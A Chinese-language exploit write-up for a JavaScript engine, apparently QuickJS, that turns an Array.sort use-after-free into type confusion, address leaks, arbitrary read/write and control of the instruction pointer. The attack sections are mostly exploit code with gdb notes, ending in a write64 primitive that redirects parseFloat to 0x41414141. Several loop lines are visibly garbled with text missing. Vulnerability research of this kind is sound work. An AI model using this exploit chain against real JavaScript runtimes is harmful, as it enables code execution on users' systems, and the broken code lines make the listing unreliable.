      390     uint32_t hash_next; /* atom_index for JS_ATOM_TYPE_SYMBOL */
      391 #ifdef DUMP_LEAKS
      392     struct list_head link; /* string list */
      393 #endif
      394     union {
      395         uint8_t str8[0]; /* 8 bit strings will get an extra null terminator */
      396         uint16_t str16[0];
      397     } u;
      398 };
JSArrayBuffer
    516 typedef struct JSArrayBuffer {
      517     int byte_length; /* 0 if detached */
      518     uint8_t detached;
      519     uint8_t shared; /* if shared, the array buffer cannot be detached */
      520     uint8_t *data; /* NULL if detached */
      521     struct list_head array_list;
      522     void *opaque;
      523     JSFreeArrayBufferDataFunc *free_func;
      524 } JSArrayBuffer;
### 3.3
### 漏洞利用，造成类型混淆
    //触发漏洞，和poc一样。
    a = [
        [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
        ....
        ....          //内存要足够大
        ], 1, 2, 3, 4
    ];
    refcopy = a[0];
    a.__defineSetter__(3, function () {
        throw 1;
    });
    try {
        a.sort(function (v) {
            return 0;
        });
    } catch (e) {}
    //根据引用计数，释放掉之前的a[0]内存。此时内存类型为JSObject。
    a[0] = 0x61616161;
    //释放掉a[0]之后，重新分配JSString类型的内存。
    refill_0 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
    //释放刚刚申请的JSString类型的内存。
    refcopy = 0;
    //申请一块新的内存，类型大小和a[0]一致，此时refill_1和refill_0指向同一块内存。
    refill_1 = [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,      //和a[0]一样
              ...
              ...
    ];
    //通过refill_0访问该内存时，该内存类型为JSString。
    //通过refill_1访问该内存时，该内存类型为JSObject。
    //造成类型混淆
创建第二个数组时，对应的gdb信息
//此时数组0保存第一个数组的地址(JSObject)，JSObject+56 偏移处保存着指向value的地址。
//重新分配JSString类型的内存。
(由于ASLR，地址变了，其实是上图中那个地址一致)
### 3.4
### 通过类型混淆泄漏JSObject的信息
    for (var i = 0; i = 0; j--) {
            var char = ptr.charCodeAt(j).toString(16);
            if (char.length == 1)
                char = '0' + char;
            val += char;
        }
        val = parseInt(val, 16);
        jsobj_leak_data[i / 4] = val;
    }
    var shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);
    var prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);
    var values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);
    print("shape @ " + shape.toString(16));
    print("prop @ " + prop.toString(16));
    print("values @ " + values.toString(16));
### 3.5
### 释放refill_1和refill_0之前的值，设置为JSObjects内存。
### refill_1、refill_0指向同一块内存
    refill_1 = 0;
    refill_1 = [0x1337, 0x1337];
    refill_0 = 0;
    refill_0 = [0x71717171];
### 3.6
### free refill_1内存，重新分配refill_1指向内存类型为jsArrayBuffer。
### refill_1、refill_0指向同一块内存，refill_0类型JSObject， refill_1类型为jsArrayBuffer。
    refill_1 = 0;
    // Need to free other JSObject size things as well to cause the
    // data to overlap and not the JSObject of the ArrayBuffer
    x = 0;
    y = 0;
    refill_1 = new Uint32Array(0x48 / 4);
    refill_1.fill(0x41414141);
此时JsArrayBuffer的data地址刚好是之前那块JSObject地址，接下来通过refill_1设置JSObject的内存。
(由于ASLR，地址变了，其实是上图中那个地址一致)
### 3.7
### 通过refill_1，设置内存的值为之前泄漏的JSObject对象的值，但是JSObject对象值的地址+0x2000，跳到堆喷可控得内存区。
### 后边利用这个操作，泄漏任意地址。
    jsobj_leak_data[(56 - 0x10) / 4] += 0x2000;
    overlap_addr = values + 0x2000;
    for (var i = 4; i values得地址。
### 利用refill_0设置master->values ==》 slave
    // Point our crafted JSObject values to the address of master->values
    refill_1[(56) / 4] = (master_addr & 0xffffffff) + 56;
    refill_0[0] = slave;
此时gdb中，master->values ==》 slave。
### 3.12
### 任意地址写
    function write64(addr, val) {
        master[56 / 4] = (addr & 0xffffffff) >>> 0;
        master[60 / 4] = addr / 0x100000000;
        slave[0] = val & 0xffffffff;
        slave[1] = val / 0x100000000;
    }
    print("jumping to 0x41414141");
    write64(parseFloat_addr + 0x30, 0x414141414141);
    parseFloat();
任意地址写  
控制rip地址  
## 0x4 exp
    function toint64(low, high) {
        return low + high * 0x100000000;
    }
    function fromint64(val) {
        return [val & 0xffffffff, val / 0x100000000];
    }
    // Global variables we are using